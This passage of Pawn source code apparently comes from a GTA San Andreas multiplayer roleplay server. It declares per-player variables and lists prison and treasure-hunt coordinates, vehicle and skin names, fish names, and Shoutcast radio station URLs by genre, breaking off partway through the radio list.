new IsBoundsShowingDF[MAX_PLAYERS];
new GlobalChat[MAX_PLAYERS];
new GlobalChatTimer[MAX_PLAYERS];
new EMSCallTime[MAX_PLAYERS];
new EMSAccepted[MAX_PLAYERS];
new MedicCallTime[MAX_PLAYERS];
new MedicAccepted[MAX_PLAYERS];
new MechanicCallTime[MAX_PLAYERS];
new DivorceOffer[MAX_PLAYERS];
new MarryWitness[MAX_PLAYERS];
new MarryWitnessOffer[MAX_PLAYERS];
new MarriageCeremoney[MAX_PLAYERS];
new ProposeOffer[MAX_PLAYERS];
new ProposedTo[MAX_PLAYERS];
new GotProposedBy[MAX_PLAYERS];
new slotselection[MAX_PLAYERS];
new ServiceTime[MAX_PLAYERS];
new WasHereForPaycheck[MAX_PLAYERS];
new SignedPaycheck[MAX_PLAYERS];
new MissedPaychecks[MAX_PLAYERS];
new LiveOffer[MAX_PLAYERS];
new IsTheReporter[MAX_PLAYERS];
new TalkingLive[MAX_PLAYERS];
new HidePM[MAX_PLAYERS];
new Backup[MAX_PLAYERS];
new RadarActive[MAX_PLAYERS];
new RadarWarning[MAX_PLAYERS];
new Text:RadarTitle[MAX_PLAYERS];
new Text:RadarContext[MAX_PLAYERS];
new FindingJob[MAX_PLAYERS];
new FindingDealership[MAX_PLAYERS];
new ShakeHandRequest[MAX_PLAYERS];
new ShakeHandStyle[MAX_PLAYERS];
new TutorialProgress[MAX_PLAYERS];
new Float:ValidArmor[MAX_PLAYERS];
new PhonePrivacy[MAX_PLAYERS];
new MP3Station[MAX_PLAYERS];
new BoomBoxSet[MAX_PLAYERS];
new PizzaVehicles[12];
new Bar:PizzaBar[MAX_PLAYERS];
new FishNamesNumber = 22;
new Float: fVehSpeed[MAX_PLAYERS];
new Float:PlayerPos[MAX_PLAYERS][6];
new Float:TelePos[MAX_PLAYERS][6];
new levelexp = 4;
//--------------------------[ ARRAYS ]---------------------------
new
	Float:AdminPrisonFloat[18][3] = {
		{215.664749, 1806.403198, 1618.534423},
		{211.635513, 1806.531005, 1618.534423},
		{207.159301, 1806.923339, 1618.535888},
		{201.544662, 1806.452758, 1618.535888},
		{197.230133, 1806.381225, 1618.535888},
		{193.142883, 1806.796752, 1618.535888},
		{215.664749, 1806.403198, 1614.260375},
		{211.635513, 1806.531005, 1614.260375},
		{207.159301, 1806.923339, 1614.260375},
		{201.544662, 1806.452758, 1614.260375},
		{197.230133, 1806.381225, 1614.260375},
		{193.142883, 1806.796752, 1614.260375},
		{215.664749, 1806.403198, 1609.985473},
		{211.635513, 1806.531005, 1609.985473},
		{207.159301, 1806.923339, 1609.985473},
		{201.544662, 1806.452758, 1609.985473},
		{197.230133, 1806.381225, 1609.985473},
		{193.142883, 1806.796752, 1609.985473}
};

#if defined TREASURE_HUNT_ENABLED
new
	iHuntLocation,
	iHuntPickup,
	Text3D: lHunt,
	Float: fTreasureHuntLS[79][3] = {
		{1229.6487, 2656.6077, 10.8203},
		{723.9209, -1827.9728, -11.1979},
		{975.8365, -1553.5372, 21.5021},
		{2838.0945, -2355.9885, 42.7344},
		{2864.8975, -2125.0532, 5.9132},
		{2839.2737, -1333.6603, 11.1132},
		{305.7408, -1348.6904, 53.3819},
		{300.4908, -1343.3966, 60.0211},
		{567.0254, -1368.8667, 52.4344},
		{-574.8304, -1484.6580, 14.3438},
		{-1848.4028, -1708.3975, 41.1117},
		{-84.5177, -102.4145, 6.4844},
		{359.0852, -1401.2878, 20.4090},
		{-406.8927, -1448.9119, 50.9145},
		{2783.3496, -1246.1157, 62.2969},
		{2750.9673, -2261.2080, 42.2668},
		{2423.9233, -2283.6018, 42.4465},
		{2258.9204, -2458.7249, 42.1496},
		{1627.6660, -2286.4536, 94.1270},
		{680.0054, 824.4684, -42.9609},
		{-84.7650, -223.2539, 80.1250},
		{-1062.0853, -696.3816, 56.3359},
		{-744.2923, -796.8502, 152.1255},
		{-609.9691, -789.1779, 79.9550},
		{1019.3333, -301.4924, 77.3594},
		{2351.4570, -653.0359, 128.0547},
		{2751.4368, -2189.9272, 46.2275},
		{1498.1407, -1665.2388, 34.0469},
		{598.8820, -1266.4218, 64.1859},
		{1094.6667, -675.9512, 110.1484},
		{65.3320, -1820.0994, -57.3189},
		{302.2582, 1035.6158, 1104.5601},
		{-1094.6779, 606.7272, 1116.5078},
		{1094.1510, -2036.9094, 82.7574},
		{1786.7986, -1303.2233, 13.5532},
		{1956.6277, -1199.6770, 16.5859},
		{2216.9233, -1190.1036, 33.5313},
		{2708.2070, -2187.5305, 27.9262},
		{1846.2129, -1135.9796, 51.8616},
		{1986.8707, -1114.6799, 35.6250},
		{2179.1436, -2008.8317, 32.4801},
		{2216.3784, -2698.1467, 17.8828},
		{603.2033, -1628.5216, 28.0547},
		{660.7752, -1602.5293, 20.3269},
		{688.5105, -1607.3796, 22.0391},
		{1654.8735, -1638.1479, 83.7813},
		{1671.3395, -1344.6774, 158.4766},
		{1651.7982, -1271.9119, 167.5547},
		{1681.6056, -1223.9996, 167.5547},
		{1278.5238, -1697.4240, 39.4375},
		{1481.8771, -1790.1433, 156.7533},
		{1764.0298, -2286.3223, 26.7960},
		{2202.5444, -2330.3840, 33.7149},
		{2280.8369, -1952.3245, 21.2188},
		{2737.8037, -1760.2153, 44.1507},
		{2840.6848, -2538.9077, 18.2075},
		{2745.8557, -1689.5879, 30.6551},
		{2660.9539, -1458.9890, 79.3805},
		{2606.5115, -1299.3252, 81.1481},
		{1099.8422, -824.3608, 114.4477},
		{939.5084, -910.8499, 80.7187},
		{309.7915, -1146.1421, 92.0492},
		{-1412.3374, -23.8541, 6.0000},
		{-2483.6931, -1549.5001, 401.5734},
		{-2753.6919, -2000.8949, 40.9872},
		{-2712.7534, -344.6357, 54.4080},
		{-1026.7931, -705.2756, 135.5049},
		{2072.7185, -1000.6807, 58.9766},
		{919.1627, -1021.8905, 107.5781},
		{-84.5577, -223.3596, 80.1250},
		{2505.3049, -2640.7354, 13.8623},
		{1474.5920, -2287.0769, 42.4205},
		{2590.4080, -632.3589, 133.3495},
		{-534.0347, -102.9933, 63.2969},
		{323.5139, -1131.3894, 80.9141},
		{194.7249, -1230.7240, 76.0469},
		{226.2876, -1186.0181, 72.0313},
		{955.2682, -719.9095, 122.2109},
		{1334.1615, -650.9788, 108.2632}
};
#endif

new Songs[7][1] = {
{1187},
{1185},
{1183},
{1097},
{1076},
{1068},
{1062}
};

new CIV[] = {7,19,20,23,73,101,122};
new STD1[] = {0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 3};
new STD2[] = {0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 3, 3, 3};
new STD3[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3};
new STD4[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 2, 3};
new SELLCAR1[] = { 100, 112, 124, 134, 147, 157, 163, 176, 189, 194, 200 };
new SELLCAR2[] = { 209, 213, 225, 237, 245, 256, 261, 272, 287, 298, 300 };
new SELLCAR3[] = { 305, 317, 321, 337, 345, 355, 367, 375, 386, 396, 400 };
new SELLCAR4[] = { 407, 412, 427, 437, 442, 456, 461, 475, 489, 491, 500 };

new FishNames[22][20] = {
{"Jacket"}, {"Amberjack"}, {"Grouper"},
{"Red Snapper"}, {"Pants"}, {"Trout"},
{"Blue Marlin"}, {"Can"}, {"Mackeral"},
{"Sea Bass"}, {"Shoes"}, {"Pike"},
{"Sail Fish"}, {"Garbage"}, {"Tuna"},
{"Eel"}, {"Dolphin"}, {"Shark"},
{"Turtle"}, {"Catfish"}, {"Money Bag"},
{"Swordfish"}
};

static const VehicleName[212][] = {
	"Landstalker","Bravura","Buffalo","Linerunner","Perennial","Sentinel","Dumper","Firetruck","Trashmaster","Stretch",
	"Manana","Infernus","Voodoo","Pony","Mule","Cheetah","Ambulance","Leviathan","Moonbeam","Esperanto","Taxi",
	"Washington","Bobcat","Mr Whoopee","BF Injection","Hunter","Premier","Enforcer","Securicar","Banshee","Predator",
	"Bus","Rhino","Barracks","Hotknife","Trailer","Previon","Coach","Cabbie","Stallion","Rumpo","RC Bandit", "Romero",
	"Packer","Monster","Admiral","Squalo","Seasparrow","Pizzaboy","Tram","Trailer","Turismo","Speeder","Reefer","Tropic","Flatbed",
	"Yankee","Caddy","Solair","Berkley's RC Van","Skimmer","PCJ-600","Faggio","Freeway","RC Baron","RC Raider",
	"Glendale","Oceanic","Sanchez","Sparrow","Patriot","Quad","Coastguard","Dinghy","Hermes","Sabre","Rustler",
	"ZR-350","Walton","Regina","Comet","BMX","Burrito","Camper","Marquis","Baggage","Dozer","Maverick","News Chopper",
	"Rancher","FBI Rancher","Virgo","Greenwood","Jetmax","Hotring Racer","Sandking","Blista Compact","Police Maverick",
	"Boxville","Benson","Mesa","RC Goblin","Hotring Racer A","Hotring Racer B","Bloodring Banger","Rancher","Super GT",
	"Elegant","Journey","Bike","Mountain Bike","Beagle","Cropduster","Stuntplane","Tanker","Road Train","Nebula","Majestic",
	"Buccaneer","Shamal","Hydra","FCR-900","NRG-500","HPV-1000","Cement Truck","Tow Truck","Fortune","Cadrona","FBI Truck",
	"Willard","Forklift","Tractor","Combine","Feltzer","Remington","Slamvan","Blade","Freight","Streak","Vortex","Vincent",
	"Bullet","Clover","Sadler","Firetruck","Hustler","Intruder","Primo","Cargobob","Tampa","Sunrise","Merit","Utility",
	"Nevada","Yosemite","Windsor","Monster A","Monster B","Uranus","Jester","Sultan","Stratum","Elegy","Raindance","RC Tiger",
	"Flash","Tahoma","Savanna","Bandito","Freight","Trailer","Kart","Mower","Duneride","Sweeper","Broadway",
	"Tornado","AT-400","DFT-30","Huntley","Stafford","BF-400","Newsvan","Tug","Trailer","Emperor","Wayfarer",
	"Euros","Hotdog","Club","Trailer","Trailer","Andromada","Dodo","RCCam","Launch","Police Car (LSPD)","Police Car (SFPD)",
	"Police Car (LVPD)","Police Ranger","Picador","S.W.A.T. Van","Alpha","Phoenix","Glendale","Sadler","Luggage Trailer A",
	"Luggage Trailer B","Stair Trailer","Boxville","Farm Plow","Utility Trailer"
};

new Peds[217][1] = {
{299},
{288},//TEAM_ADMIN
{286},{287},{228},{113},{120},{147},{294},{227},{61},{171},
{247},//CIVILIANS DOWN HERE
{248},{100},{256},{263},{262},{261},{260},{259},{258},{257},{256},{255},
{253},{252},{251},{249},{246},{245},{244},{243},{242},{241},{240},{239},
{238},{237},{236},{235},{234},{233},{232},{231},{230},{229},
{226},{225},{173},{174},{175},{224},{223},{222},{221},{220},{219},{218},
{217},{216},{215},{214},{213},{212},{211},{210},{209},
{207},{206},{205},{204},{203},{202},{201},{200},{199},{198},{197},{196},
{195},{194},{193},{192},{191},{190},{189},{185},{184},{183},
{182},{181},{180},{179},{178},{176},{172},{170},{168},{167},{162},
{161},{160},{159},{158},{157},{156},{155},{154},{153},{152},{151},
{146},{145},{144},{143},{142},{141},{140},{139},{138},{137},{136},{135},
{134},{133},{132},{131},{130},{129},{128},{254},{99},{97},{96},{95},{94},
{92},{90},{89},{88},{87},{85},{84},{83},{82},{81},{80},{79},{78},{77},{76},
{75},{73},{72},{69},{68},{67},{66},{64},{63},{62},{58},{57},{56},{55},
{54},{53},{52},{51},{50},{49},{45},{44},{43},{41},{39},{38},{37},{36},{35},
{34},{33},{32},{31},{30},{29},{28},{27},{26},{25},{24},{23},{22},{21},{20},
{19},{18},{17},{16},{15},{14},{13},{12},{11},{10},{1},{2},
{290},//ROSE
{291},//PAUL
{292},//CESAR
{293},//OGLOC
{187},
{296},//JIZZY
{297},//MADDOGG
{298},//CAT
{299}//ZERO
};

enum VehicleRadioEnum
{
	radioname[32],
	radiourl[128],
	listeners
}

new VehicleRadioListing[220][VehicleRadioEnum] = {
// Alternative (0-9)
{"Idobi Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=21585"},
{"181.FM The Buzz","http://yp.shoutcast.com/sbin/tunein-station.pls?id=37586"},
{"RauteMusik.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1275071"},
{"FM4","http://yp.shoutcast.com/sbin/tunein-station.pls?id=581319"},
{"ChroniX Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377260"},
{"Pinguin Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=199753"},
{"KEXP","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272835"},
{"KCRW Simulcas","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1269598"},
{"Metal Only","http://yp.shoutcast.com/sbin/tunein-station.pls?id=477309"},
{"1.FM Channel X","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1274225"},

// Blues 10-19)
{"1.FM - Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1270282"},
{"BellyUp4Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=11408"},
{"CALMRADIO - BLUES","http://yp.shoutcast.com/sbin/tunein-station.pls?id=205177"},
{"KOQX Blues Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1271824"},
{"GotRadio - Bit 'O Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=533805"},
{"radioio blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1278494"},
{"Polskie Radio - Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1044755"},
{"Big Blue Swing","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377377"},
{"City Sounds Radio Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=20151"},
{"Calm Radio Blues","http://yp.shoutcast.com/sbin/tunein-station.pls?id=205177"},

// Classical (20-29)
{"CLASSICAL 102","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1676910"},
{"Iowa Public Radio Classical","http://yp.shoutcast.com/sbin/tunein-station.pls?id=177883"},
{"181.FM Classic Hits","http://yp.shoutcast.com/sbin/tunein-station.pls?id=213419"},
{"Cinemix","http://yp.shoutcast.com/sbin/tunein-station.pls?id=614375"},
{"Venice Classic Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1704166"},
{"Solo Piano SKY.FM.","http://yp.shoutcast.com/sbin/tunein-station.pls?id=600682"},
{"Mostly Classical - SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=744232"},
{"Adagio.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=212505"},
{"Classical 96.3FM CFMZ","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2271823"},
{"Abacus.fm Mozart Piano","http://yp.shoutcast.com/sbin/tunein-station.pls?id=119965"},

// Country (30-39)
{"181.FM Kickin' Country","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1283687"},
{"Always Country","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1274260"},
{"COUNTRY 108","http://yp.shoutcast.com/sbin/tunein-station.pls?id=668943"},
{"181.FM Highway 181","http://yp.shoutcast.com/sbin/tunein-station.pls?id=147942"},
{"HPR1","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1270526"},
{"Radio Positiva Sertaneja","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2890335"},
{"1.FM Country","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1274603"},
{"Boot Liquor","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377561"},
{"Absolute COUNTRY Hits","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1268458"},
{"181.FM Real Country","http://yp.shoutcast.com/sbin/tunein-station.pls?id=163622"},

// Decades (40-49)
{"Big R Radio Warm 101.6","http://yp.shoutcast.com/sbin/tunein-station.pls?id=33097"},
{"Big R Radio The Hawk","http://yp.shoutcast.com/sbin/tunein-station.pls?id=211531"},
{"Big R Radio 100.7 The Mix","http://yp.shoutcast.com/sbin/tunein-station.pls?id=61826"},
{"Abacus.fm Vintage Jazz","http://yp.shoutcast.com/sbin/tunein-station.pls?id=242774"},
{"Oldies104","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1271826"},
{"1.FM 50s and 60s","http://yp.shoutcast.com/sbin/tunein-station.pls?id=37833"},
{"The Doo-Wop Express","http://yp.shoutcast.com/sbin/tunein-station.pls?id=727560"},
{"Beatles Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1273220"},
{"1.FM 80s Channel","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1274599"},
{"SKY.FM 80s","http://yp.shoutcast.com/sbin/tunein-station.pls?id=737152"},

// Easy Listening (50-59)
{"Slow Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1658657"},
{"MUSIK.LOUNGE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=130940"},
{"Blue FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=48138"},
{"SKY.FM Mostly Classical","http://yp.shoutcast.com/sbin/tunein-station.pls?id=744232"},
{"Radio227 Easy Listening","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2313198"},
{"COOL93","http://yp.shoutcast.com/sbin/tunein-station.pls?id=63135"},
{"KLUX 89.5HD -","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1697"},
{"AbidingRadio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=470854"},
{"Lounge Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1288934"},
{"1.FM The Chillout Loung","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1268725"},

// Electronic (60-69)
{"TechnoBase.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377200"},
{"Vocal Trance","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1177953"},
{"MUSIK.HOUSE Funky","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2128868"},
{"Trance Channel","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1193516"},
{"HouseTime.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377360"},
{"dubstep.fm","http://yp.shoutcast.com/sbin/tunein-station.pls?id=7225"},
{"54House.FM.","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2808203"},
{"#MUSIK.DRUMSTEP","http://yp.shoutcast.com/sbin/tunein-station.pls?id=46883"},
{"HardBase.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377430"},
{"Techno4Ever Main","http://yp.shoutcast.com/sbin/tunein-station.pls?id=226769"},

// Folk (70-79)
{"Radio Free Vermont","http://yp.shoutcast.com/sbin/tunein-station.pls?id=168942"},
{"Pink Narodna Muzika","http://yp.shoutcast.com/sbin/tunein-station.pls?id=883729"},
{"Dzungla Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1279638"},
{"Folk Alley","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1273365"},
{"Radio BN","http://yp.shoutcast.com/sbin/tunein-station.pls?id=29949"},
{"Radio Glas Drine","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1841408"},
{"COOL radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=550002"},
{"AM 1710 Antioch OT","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2699"},
{"A&P Radio Network","http://yp.shoutcast.com/sbin/tunein-station.pls?id=563824"},
{"New Age SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=412093"},

// Inspirational (80-89)
{"Russian Christian Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1280598"},
{"AbidingRadio INSTRUMENTAL","http://yp.shoutcast.com/sbin/tunein-station.pls?id=470854"},
{"1-ONE NATION FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1988533"},
{"XL Radio Gurbani Kirtan","http://yp.shoutcast.com/sbin/tunein-station.pls?id=272693"},
{"Radio Lumiere Miami","http://yp.shoutcast.com/sbin/tunein-station.pls?id=341387"},
{"Ancient Faith Music","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2010550"},
{"Bautista Radio 89.7 FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=347942"},
{"Radio Nueva Vida","http://yp.shoutcast.com/sbin/tunein-station.pls?id=208506"},
{"ChristianRock","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1266649"},
{"FBC Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=95154"},

// International (90-99)
{"Arabic Music Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=326370"},
{"SEOULFM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=246183"},
{"Radio CARERA NUMBER ONE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=289391"},
{"Schlagerhoelle","http://yp.shoutcast.com/sbin/tunein-station.pls?id=702040"},
{"Ballermann-Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=63072"},
{"RADIONL","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1281197"},
{"RaDioTEENTAAL","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1268068"},
{"Tutku Fm","http://yp.shoutcast.com/sbin/tunein-station.pls?id=21994"},
{"Radio Jacaro","http://yp.shoutcast.com/sbin/tunein-station.pls?id=228698"},
{"BeirutNights","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1168254"},

// Jazz (100-109)
{"SMOOTHJAZZ","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1339789"},
{"Absolutely Smooth Jazz SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=496891"},
{"SwissGroove","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1269641"},
{"Dinner Jazz Excursion","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272149"},
{"181.fm The Breeze","http://yp.shoutcast.com/sbin/tunein-station.pls?id=133405"},
{"A1Smooth","http://yp.shoutcast.com/sbin/tunein-station.pls?id=348116"},
{"SmoothLounge","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1339960"},
{"1.FM Bay Smooth Jazz","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1271416"},
{"CROOZE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1269135"},
{"Jazz Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1256018"},

// Latin (110-119)
{"Salsa SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=835183"},
{"La X Estereo 100 Pura Salsa","http://yp.shoutcast.com/sbin/tunein-station.pls?id=96644"},
{"Reggaeton 24/7","http://yp.shoutcast.com/sbin/tunein-station.pls?id=56349"},
{"LATINO FM EN DIRECTO","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1280049"},
{"Suave 107.3 FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1593716"},
{"LA PACHANGUERA FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2147665"},
{"XHBIO FIESTA MEXICANA","http://yp.shoutcast.com/sbin/tunein-station.pls?id=338824"},
{"Latin.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=381441"},
{"MKM CARAIBE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1818724"},
{"FUSION","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2919730"},

// Metal (120-129)
{"MUSIK.ROCK","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1275071"},
{"RockRadio1","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1105299"},
{"METAL ONLY","http://yp.shoutcast.com/sbin/tunein-station.pls?id=477309"},
{"RockRadio1","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1105299"},
{"ChroniX GRIT Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2187022"},
{"MUSIK.METAL","http://yp.shoutcast.com/sbin/tunein-station.pls?id=141469"},
{"Hard Rock Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=625229"},
{"Death.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2885733"},
{"Big R Radio 80s Metal FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=278974"},
{"1.FM High Voltage","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272098"},

// Misc (130-139)
{"TOP100","http://yp.shoutcast.com/sbin/tunein-station.pls?id=239589"},
{"TOP 100 ReaLCasT","http://yp.shoutcast.com/sbin/tunein-station.pls?id=242423"},
{"NeoFM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=548973"},
{"radioparty.pl","http://yp.shoutcast.com/sbin/tunein-station.pls?id=97678"},
{"Desetka Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377246"},
{"Adom 106.3FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=292951"},
{"Joy FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=3730"},
{"RADIO INFERNO MANELE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=293251"},
{"Narodni radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=31307"},
{"RaDYO DoGu MiX","http://yp.shoutcast.com/sbin/tunein-station.pls?id=245201"},

// New Age (140-149)
{"Nirvana Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272871"},
{"Radio Art","http://yp.shoutcast.com/sbin/tunein-station.pls?id=411208"},
{"Trancemission.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1272865"},
{"Pianorama","http://yp.shoutcast.com/sbin/tunein-station.pls?id=27717"},
{"RADIO GAIA","http://yp.shoutcast.com/sbin/tunein-station.pls?id=187880"},
{"M2 CHILLOUT","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1279147"},
{"Underground Eighties","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377340"},
{"Digital Relax","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1254140"},
{"meditation.fm","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2269332"},
{"1.FM Flashback Alternatives","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1268764"},

// Pop (150-159)
{"181.FM - POWER 181","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1283896"},
{"Radio Paloma","http://yp.shoutcast.com/sbin/tunein-station.pls?id=710507"},
{"MUSIK.MAIN","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1275878"},
{".977 The Hitz Channel","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1280356"},
{"Lux FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=967434"},
{"Radio VHR","http://yp.shoutcast.com/sbin/tunein-station.pls?id=117838"},
{"Radio Paloma","http://yp.shoutcast.com/sbin/tunein-station.pls?id=710507"},
{"ChartHits.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=43280"},
{"Top Hits Music SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=728272"},
{"Pop Radio One","http://yp.shoutcast.com/sbin/tunein-station.pls?id=128879"},

// Public Radio (160-169)
{"WUNC FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1271964"},
{"KPBS","http://yp.shoutcast.com/sbin/tunein-station.pls?id=632915"},
{"89.7 WUWM HD","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1278952"},
{"WHRO","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1544465"},
{"KCRW ECLECTIC24","http://yp.shoutcast.com/sbin/tunein-station.pls?id=56697"},
{"SomaFM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1377771"},
{"WKCR","http://yp.shoutcast.com/sbin/tunein-station.pls?id=2100812"},
{"Rete Sport","http://yp.shoutcast.com/sbin/tunein-station.pls?id=3090344"},
{"North Country Public Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=857520"},
{"RIPR","http://yp.shoutcast.com/sbin/tunein-station.pls?id=232368"},

// R&B/Urban (170-179)
{"DEFJAY.DE","http://yp.shoutcast.com/sbin/tunein-station.pls?id=65456"},
{"Amped FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=178297"},
{"HIT104","http://yp.shoutcast.com/sbin/tunein-station.pls?id=663859"},
{"BreakZ.us","http://yp.shoutcast.com/sbin/tunein-station.pls?id=127014"},
{"181.fm True R&B","http://yp.shoutcast.com/sbin/tunein-station.pls?id=83968"},
{"1POWER","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1283516"},
{"BlackBeats.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1543115"},
{"Lenz Radio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1273477"},
{"DEFJAY.COM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=616366"},
{"Spin 1038","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1328653"},

// Rap (180-189)
{"HOT 108 JAMZ","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1281016"},
{"MUSIK.JAM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1269742"},
{"181.FM The BEAT","http://yp.shoutcast.com/sbin/tunein-station.pls?id=166078"},
{"Smoothbeats","http://yp.shoutcast.com/sbin/tunein-station.pls?id=9054"},
{"108.FM THE HITLIST","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1282490"},
{"TrueHipHop","http://yp.shoutcast.com/sbin/tunein-station.pls?id=3083251"},
{"A1Jamz","http://yp.shoutcast.com/sbin/tunein-station.pls?id=49567"},
{"True Beats","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1267461"},
{"MKM URBAN","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1818926"},
{"G'D UP RADIO","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1504548"},

// Reggae (190-199)
{"Roots Reggae SKY.FM","http://yp.shoutcast.com/sbin/tunein-station.pls?id=695657"},
{"La Grosse Radio Reggae","http://yp.shoutcast.com/sbin/tunein-station.pls?id=5661"},
{"BigUpRadio","http://yp.shoutcast.com/sbin/tunein-station.pls?id=1269793"},
{"Raggakings","http://yp.shoutcast.com/sbin/tunein-station.pls?id=123431"},
